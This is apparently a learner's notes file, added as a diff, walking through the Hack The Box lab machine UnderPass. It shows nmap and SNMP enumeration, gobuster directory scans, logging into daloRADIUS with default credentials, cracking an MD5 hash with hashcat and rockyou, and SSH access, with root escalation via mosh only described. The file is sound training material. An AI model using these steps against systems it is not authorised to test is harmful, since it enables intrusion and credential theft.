@@ -1,0 +1,208 @@
+**How many open TCP ports are listening on UnderPass?**
+lets nmap
+ nmap -sS -T4 -p- -Pn 10.10.11.48
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 13:35 EDT
+Nmap scan report for 10.10.11.48
+Host is up (0.078s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 95.98 seconds
+so it seems like 2
+
+**What UDP port in the nmap top 100 ports is open on UnderPass?**
+nmap -sU -T4 -p1-100 -Pn 10.10.11.48
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 13:39 EDT
+Warning: 10.10.11.48 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.11.48
+Host is up (0.077s latency).
+Not shown: 88 closed udp ports (port-unreach)
+PORT   STATE         SERVICE
+4/udp  open|filtered unknown
+20/udp open|filtered ftp-data
+21/udp open|filtered ftp
+22/udp open|filtered ssh
+27/udp open|filtered nsw-fe
+29/udp open|filtered msg-icp
+34/udp open|filtered unknown
+58/udp open|filtered xns-mail
+64/udp open|filtered covia
+78/udp open|filtered vettcp
+86/udp open|filtered mfcobol
+93/udp open|filtered dcp
+
+Nmap done: 1 IP address (1 host up) scanned in 87.17 seconds
+so they meant top used port appearently 
+nmap -sU -T4 --top-ports=100 -Pn 10.10.11.48
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 13:44 EDT
+Nmap scan report for 10.10.11.48
+Host is up (0.080s latency).
+Not shown: 54 closed udp ports (port-unreach), 45 open|filtered udp ports (no-response)
+PORT    STATE SERVICE
+161/udp open  snmp
+
+Nmap done: 1 IP address (1 host up) scanned in 52.46 seconds
+
+**What email address does the UnderPass server list as it's contact email?**
+i saw http is open lets check the web no its an ubunto default page 
+lets search what is it snmp
+snmp- SNMP, or Simple Network Management Protocol, is a widely used internet standard protocol for monitoring and managing network devices
+so i used the hint "**Use a tool like snmp-check or snmp-walk to enumerate SNMP.**"
+so lets find those tools syntax and how to use them:
+
+snmp-check : 
+Scan the target host (192.168.1.2) using the public SNMP community string (-c public):
+syntax: snmp-check 192.168.1.2 -c public
+
+snmp-walk:
+An SNMP walk is a process of sequentially retrieving all the available information from a network device using SNMP GETNEXT requests. It's a way to gather a large amount of data, especially when the specific OIDs (Object Identifiers) you're looking for aren't known beforehand. 
+syntax: snmpwalk -v1 -c public 192.168.8.1
+
+lets try those:
+snmpwalk -v1 -c public 10.10.11.48
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (214814) 0:35:48.14
+iso.3.6.1.2.1.1.4.0 = STRING: "**steve@underpass.htb**"
+iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
+iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+iso.3.6.1.2.1.1.8.0 = Timeticks: (3) 0:00:00.03
+iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
+iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
+iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
+iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
+iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
+iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
+iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
+iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
+iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
+iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
+iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
+iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
+iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
+iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
+iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
+iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
+iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
+iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
+iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
+iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (2) 0:00:00.02
+iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (2) 0:00:00.02
+iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (2) 0:00:00.02
+iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (2) 0:00:00.02
+iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (2) 0:00:00.02
+iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (3) 0:00:00.03
+iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (3) 0:00:00.03
+iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (3) 0:00:00.03
+iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (3) 0:00:00.03
+iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (3) 0:00:00.03
+iso.3.6.1.2.1.25.1.1.0 = Timeticks: (216084) 0:36:00.84
+iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 06 09 12 07 1B 00 2B 00 00 
+iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
+iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
+"
+iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
+iso.3.6.1.2.1.25.1.6.0 = Gauge32: 213
+iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
+End of MIB
+
+snmp-check:
+snmp-check 10.10.11.48 -c public
+snmp-check v1.9 - SNMP enumerator
+Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
+
+[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'
+
+[*] System information:
+
+  Host IP address               : 10.10.11.48
+  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
+  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
+**Contact                       : steve@underpass.htb**
+  Location                      : Nevada, U.S.A. but not Vegas
+  Uptime snmp                   : 00:38:31.82
+  Uptime system                 : 00:38:21.65
+  System date                   : 2025-6-9 18:09:58.0
+
+so after learning those tools we find the target steve@underpass.htb
+
+**What is the name of the application hosted on the UnderPass webserver?**
+so after hint 
+gobuster dir -u 10.10.11.48/daloradius/ -w /usr/share/wordlists/dirb/common.txt -t 50
+sudo gobuster dir -u 10.10.11.48/daloradius/app -w /usr/share/wordlists/dirb/common.txt -t 50
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.11.48/daloradius/app
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/common               (Status: 301) [Size: 326] [--> http://10.10.11.48/daloradius/app/common/]
+/.hta                 (Status: 403) [Size: 276]
+/.htaccess            (Status: 403) [Size: 276]
+/.htpasswd            (Status: 403) [Size: 276]
+/users                (Status: 301) [Size: 325] [--> http://10.10.11.48/daloradius/app/users/]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+**What is the password for the administrator user on the daloRADIUS application?**
+so users ask for credentials: lets find the defauls for there server 
+adminstrator and radius worked as they default 
+**What is the clear text password of the svcMosh user on UnderPass?**
+found this passs in the pages of the server 
+lets hash-id
+ashid 412DD4759978ACFCC81DEAB01B382403
+Analyzing '412DD4759978ACFCC81DEAB01B382403'
+[+] MD2 
+[+] MD5 
+[+] MD4 
+[+] Double MD5 
+[+] LM 
+[+] RIPEMD-128 
+[+] Haval-128 
+[+] Tiger-128 
+[+] Skein-256(128) 
+[+] Skein-512(128) 
+[+] Lotus Notes/Domino 5 
+[+] Skype 
+[+] Snefru-128 
+[+] NTLM 
+[+] Domain Cached Credentials 
+[+] Domain Cached Credentials 2 
+[+] DNSSEC(NSEC3) 
+[+] RAdmin v2.x
+so if its as it says only wordlists can help us with this encryption md5 lets decrypt it 
+
+sudo hashcat -m 0 -a 0 412DD4759978ACFCC81DEAB01B382403 /usr/share/wordlists/rockyou.txt
+so that cracked its **underwaterfreinds**
+**Submit the flag located in the svcMosh user's home directory?**
+lets try connecting to the user with ssh 
+ssh svcMosh@10.10.11.48
+and it worked we are in !!!
+so  i used sudo -l to find the svcmosh commands he has high permissions to run and he has permission to run shell in root permissions so i saw that people just connected the shell to the same comp at localhost then got root privileges and got the password this way
+ENDED
+
+
+
+
+
+
+things i learned :
+snmp & snmp enum tools walk and check
+working out with mosh (mobile shell)
+**keep looking up even in walkthrough it can come from directions not related to the last answer**
+h
+
